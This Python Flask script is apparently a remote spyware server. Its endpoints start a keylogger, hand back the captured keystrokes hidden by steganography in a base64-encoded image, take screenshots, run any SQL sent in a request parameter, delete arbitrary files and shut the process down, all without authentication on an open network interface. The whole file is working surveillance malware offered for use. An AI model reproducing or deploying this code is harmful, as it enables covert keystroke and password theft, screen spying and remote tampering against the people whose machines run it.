#!/usr/bin/env python3
import socket
import os
import pyxhook
import requests
from flask import Flask
from flask import request, Response
from flask import g
import sqlite3
import pathlib
import pyautogui
import base64
from utils import stegano_decrypt, stegano_encrypt

mydb = sqlite3.connect("user.db")

# Creating an instance of 'cursor' class
# which is used to execute the 'SQL'
# statements in 'Python'
cursor = mydb.cursor()
app = Flask(__name__)

def get_db(path_to_db):
    db = getattr(g, '_database', None)
    if db is None:
        db = sqlite3.connect(path_to_db)
    return db

def screen_shot():
    screenshot = pyautogui.screenshot()
    screenshot.save('/tmp/test.png')
    with open('/tmp/test.png','rb')  as f:
        data = f.read()
    return data

def start_key_logger():
    # Python code for keylogger
    # to be used in linux

    # This tells the keylogger where the log file will go.
    # You can set the file path as an environment variable ('pylogger_file'),
    # or use the default ~/Desktop/file.log
    log_file = os.environ.get(
        'pylogger_file',
        os.path.expanduser('./file.log')
    )
    # Allow setting the cancel key from environment args, Default: `
    cancel_key = ord(
        os.environ.get(
            'pylogger_cancel',
            '`'
        )[0]
    )

    # Allow clearing the log file on start, if pylogger_clean is defined.
    if os.environ.get('pylogger_clean', None) is not None:
        try:
            os.remove(log_file)
        except EnvironmentError:
            # File does not exist, or no permissions.
            pass

    # creating key pressing event and saving it into log file
    def OnKeyPress(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))

            # create a hook manager object

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress
    # set the hook
    new_hook.HookKeyboard()
    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))

# Shutdown the server
def shutdown_server():
    # Terminate server process
    os._exit(0)

@app.route('/')
def hello_world():
    return 'Hello world!'

@app.post('/sql')
def sql_file():
    print(request.args.get('parameter'))

    # cursor.execute(request.form.get('parameter'))
    # result = cursor.fetchall()
    db = get_db("user.db")
    cursor = db.cursor()
    cursor.execute(request.args.get('parameter'))
    result = cursor.fetchall()
    print(result)
    return result

@app.post('/delete')
# Define the route and the request method
def delete_file():
    # Define a function to check if a directory is not empty
    def notempty(filepath):
        # Retrieve all files and folders inside the specified directory
        files = filepath.rglob("*")
        for file in files:
             # Print each file path and return True if any file is found
            print(file)
            return True
        # Return False if the directory is empty
        return False
    # Get JSON data from the request
    jdata = request.json
     # Check if the 'filename' key is provided in the JSON request
    if jdata.get('filename') is None:
         # Return an error message if 'filename' is not provided
        return "empty argument: filename"
     # Create a pathlib.Path object from the 'filename' provided
    filepath = pathlib.Path(jdata.get('filename'))
     # Check if the file or directory exists
    if filepath.exists() == False:
         # Return an error message if the file or directory does not exist
        return f"filepath: {filepath.resolve()} doesn't exists."
     # Check if the path is a directory and it is not empty
    if filepath.is_dir() == True and notempty(filepath):
        # Return a message indicating the directory is not empty
        return f'filepath: {filepath.resolve()} is directory and not empty.'
    # Delete the file or empty directory
    filepath.unlink()
    # Return a success message indicating the file has been deleted
    return f'delete file: {filepath.resolve()} success.'
    
@app.post('/key')
# do the keylog
def keylogger():
    start_key_logger()
    return 'keylogger started'

# https://pypi.org/project/stegano/
@app.get("/getkeylogger")
def getkeylogger():
    with open('./file.log', 'r') as f:
        data = f.read()
    nidedata = stegano_encrypt(data, './test.png')
    base64data = base64.b64encode(nidedata).decode()
    return base64data
    
@app.route('/shot',methods=["POST","GET"])
# do the screenshot
def screenshot():
    data = screen_shot()
    # data = base64.b64encode(data).decode()
    return Response(data,mimetype='image/png')

@app.post('/shutdown')
def shutdown():
    shutdown_server()
    return "Success"

if __name__ == '__main__':
    app.run(host='0.0.0.0')
